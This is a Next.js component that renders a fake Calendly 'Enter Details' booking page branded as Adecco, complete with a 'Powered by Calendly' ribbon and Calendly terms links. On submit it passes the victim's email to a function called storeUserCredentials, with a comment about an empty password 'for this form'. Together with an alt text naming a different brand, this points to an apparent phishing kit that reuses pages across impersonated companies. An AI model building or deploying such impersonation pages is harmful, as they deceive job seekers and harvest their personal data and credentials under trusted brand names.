"use client"

import type React from "react"

import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Clock, Calendar, Globe, ArrowLeft } from "lucide-react"
import { useRouter } from "next/navigation"
import { storeUserCredentials } from "@/lib/session-tracking"

export default function EnterDetails() {
  const router = useRouter()

  const handleBackClick = () => {
    router.back() // Go back to the previous page
  }

  const handleScheduleEvent = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get form data
    const formData = new FormData(e.target as HTMLFormElement)
    const name = formData.get("name") as string
    const email = formData.get("email") as string
    
    // Store email in database if provided
    if (email) {
      await storeUserCredentials(email, '', undefined) // Empty password for this form
    }
    
    // Logic to schedule the event (e.g., API call)
    console.log("Event Scheduled!")
    router.push("/confirmation") // Navigate to the confirmation screen
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
      <Card className="w-full max-w-4xl flex flex-col md:flex-row shadow-lg rounded-lg overflow-hidden relative">
        {/* Calendly Ribbon */}
        <div className="absolute top-4 right-0 bg-gray-800 text-white text-xs px-4 py-1 transform rotate-45 translate-x-1/4 -translate-y-1/4 origin-top-right shadow-md">
          Powered by Calendly
        </div>

        {/* Left Column - Meeting Details */}
        <div className="flex-1 p-8 bg-white border-r border-gray-200 flex flex-col justify-between">
          <div>
            <Button
              variant="ghost"
              size="icon"
              onClick={handleBackClick}
              className="mb-6 rounded-full hover:bg-gray-100"
            >
              <ArrowLeft className="w-6 h-6 text-blue-600" />
            </Button>
            <Image src="/adecco.jpg" alt="Zara logo" width={100} height={36} className="mb-6" />
            <h2 className="text-lg font-semibold text-gray-600">Adecco</h2>
            <h1 className="text-3xl font-bold mb-6">Meeting</h1>
            <div className="space-y-3 text-gray-700">
              <div className="flex items-center gap-2">
                <Clock className="w-5 h-5 text-gray-500" />
                <span>30 min</span>
              </div>
              <div className="flex items-center gap-2">
                <Calendar className="w-5 h-5 text-gray-500" />
                <span>3:30pm - 4:00pm, Thursday, July 10, 2025</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-5 h-5 text-gray-500" />
                <span>Central European Time</span>
              </div>
            </div>
          </div>
          <div className="flex justify-start text-sm text-blue-600 mt-8">
            <a href="#" className="hover:underline">
              Cookie settings
            </a>
          </div>
        </div>

        {/* Right Column - Enter Details Form */}
        <div className="flex-1 p-8 bg-gray-50">
          <h2 className="text-2xl font-semibold mb-6">Enter Details</h2>
          <form onSubmit={handleScheduleEvent} className="space-y-6">
            <div>
              <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-1">
                Name *
              </label>
              <Input id="name" type="text" required className="w-full" />
            </div>
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                Email *
              </label>
              <Input id="email" type="email" required className="w-full" />
            </div>
            <p className="text-sm text-gray-600">
              By proceeding, you confirm that you have read and agree to{" "}
              <a href="#" className="text-blue-600 hover:underline">
                Calendly's Terms of Use
              </a>{" "}
              and{" "}
              <a href="#" className="text-blue-600 hover:underline">
                Privacy Notice.
              </a>
            </p>
            <Button 
              type="submit" 
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
            >
              Schedule Event
            </Button>
          </form>
        </div>
      </Card>
    </div>
  )
}
